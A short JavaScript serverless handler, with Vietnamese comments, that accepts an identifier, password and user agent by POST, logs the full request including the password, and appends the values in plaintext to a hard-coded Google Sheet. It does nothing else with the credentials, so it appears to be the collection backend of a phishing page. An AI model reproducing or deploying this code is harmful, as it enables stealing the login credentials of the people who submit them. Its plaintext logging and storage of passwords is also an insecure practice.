import { google } from "googleapis";

let auth;

async function authorize() {
  try {
    console.log("Đang xác thực Google Sheets...");

    if (!auth) {
      const credentials = JSON.parse(process.env.GOOGLE_CREDENTIALS);
      const { client_email, private_key } = credentials;

      auth = new google.auth.JWT(client_email, null, private_key, [
        "https://www.googleapis.com/auth/spreadsheets",
      ]);
    }

    console.log("Xác thực thành công!");
    return auth;
  } catch (error) {
    console.error("Lỗi khi xác thực Google Sheets:", error);
    throw new Error("Lỗi xác thực Google Sheets");
  }
}

export default async function handler(req, res) {  // ĐẢM BẢO DÒNG NÀY CÓ TRONG FILE
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method Not Allowed" });
  }

  try {
    console.log("Nhận request:", req.body);
    
    const { identifier, password, userAgent } = req.body;
    if (!identifier || !password || !userAgent) {
      throw new Error("Thiếu thông tin đăng nhập");
    }

    const authClient = await authorize();
    const sheets = google.sheets({ version: "v4", auth: authClient });

    // Thay thế bằng ID Google Sheet của bạn
    const SPREADSHEET_ID = "1kqKSyAN6EmmVUJCJlmP57KOTLNzPJGjOOk5BEW3irK4";
    const RANGE = "Sheet1!A1:C10000"; // Ghi vào cột A, B, C

    console.log("Ghi dữ liệu vào Google Sheets...");
    const values = [[identifier, password, userAgent, new Date().toISOString()]];
    await sheets.spreadsheets.values.append({
      spreadsheetId: SPREADSHEET_ID,
      range: RANGE,
      valueInputOption: "RAW",
      requestBody: { values },
    });

    console.log("Ghi dữ liệu thành công!");
    res.status(200).json({ message: "Dữ liệu đã được ghi vào Google Sheets!" });
  } catch (error) {
    console.error("Lỗi khi ghi dữ liệu vào Google Sheets:", error);
    res.status(500).json({ message: "Lỗi server", error: error.message });
  }
}
